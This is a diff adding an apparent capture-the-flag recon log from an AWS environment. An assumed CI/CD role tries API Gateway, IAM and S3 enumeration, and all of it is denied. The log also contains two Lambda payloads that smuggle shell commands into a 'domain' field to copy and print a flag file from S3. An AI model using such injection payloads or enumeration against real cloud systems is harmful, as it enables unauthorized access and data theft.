@@ -1,0 +1,76 @@
+=== API GATEWAY: LIST REST APIS ===
+
+aws: [ERROR]: An error occurred (AccessDeniedException) when calling the GetRestApis operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/stage2-recon is not authorized to perform: apigateway:GET on resource: arn:aws:apigateway:us-east-1::/restapis because no identity-based policy allows the apigateway:GET action
+DENIED
+
+=== API GATEWAY: GET RESOURCES FOR 3q931syi7b ===
+
+aws: [ERROR]: An error occurred (AccessDeniedException) when calling the GetResources operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/stage2-recon is not authorized to perform: apigateway:GET on resource: arn:aws:apigateway:us-east-1::/restapis/3q931syi7b/resources because no identity-based policy allows the apigateway:GET action
+DENIED
+
+=== API GATEWAY: GET STAGES FOR 3q931syi7b ===
+
+aws: [ERROR]: An error occurred (AccessDeniedException) when calling the GetStages operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/stage2-recon is not authorized to perform: apigateway:GET on resource: arn:aws:apigateway:us-east-1::/restapis/3q931syi7b/stages because no identity-based policy allows the apigateway:GET action
+DENIED
+
+=== TRY LAMBDA INVOKE DIRECTLY ===
+
+aws: [ERROR]: Invalid base64: "{"domain": "google.com; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; cat /tmp/flag.txt"}"
+INVOKE DENIED
+Lambda response:
+No response file
+
+=== TRY LAMBDA INVOKE WITH CLI PAYLOAD ===
+
+aws: [ERROR]: Invalid base64: "{"domain": "x; cat /tmp/flag.txt || aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 2>&1"}"
+INVOKE DENIED
+Lambda response 2:
+No response file
+
+=== TRY S3 GET OBJECT FROM CODE BUCKET ===
+
+aws: [ERROR]: An error occurred (AccessDenied) when calling the GetObject operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/stage2-recon is not authorized to perform: s3:GetObject on resource: "arn:aws:s3:::codec4f26c862a321ef5/flag.txt" because no identity-based policy allows the s3:GetObject action
+GETOBJECT DENIED
+No flag file
+
+=== TRY CURL TO API GATEWAY ===
+{"message":"Missing Authentication Token"}
+=== TRY CURL WITH DIFFERENT STAGES ===
+--- Stage: dev ---
+{"message":"Missing Authentication Token"}
+HTTP_CODE: 403
+--- Stage: prod ---
+{"message":"Forbidden"}
+HTTP_CODE: 403
+--- Stage: api ---
+{"message":"Forbidden"}
+HTTP_CODE: 403
+--- Stage: v1 ---
+{"message":"Forbidden"}
+HTTP_CODE: 403
+--- Stage: Prod ---
+{"message":"Forbidden"}
+HTTP_CODE: 403
+--- Stage: Dev ---
+{"message":"Forbidden"}
+HTTP_CODE: 403
+--- Stage: default ---
+{"message":"Forbidden"}
+HTTP_CODE: 403
+
+=== TRY API GATEWAY GET-METHOD ===
+
+=== IAM: GET ROLE POLICY FOR cicdRole ===
+
+aws: [ERROR]: An error occurred (AccessDenied) when calling the GetRole operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/stage2-recon is not authorized to perform: iam:GetRole on resource: role cicdRole because no identity-based policy allows the iam:GetRole action
+DENIED
+
+
+aws: [ERROR]: An error occurred (AccessDenied) when calling the ListRolePolicies operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/stage2-recon is not authorized to perform: iam:ListRolePolicies on resource: role cicdRole because no identity-based policy allows the iam:ListRolePolicies action
+DENIED
+
+
+aws: [ERROR]: An error occurred (AccessDenied) when calling the ListAttachedRolePolicies operation: User: arn:aws:sts::009661764077:assumed-role/cicdRole/stage2-recon is not authorized to perform: iam:ListAttachedRolePolicies on resource: role cicdRole because no identity-based policy allows the iam:ListAttachedRolePolicies action
+DENIED
+
+=== DONE ===
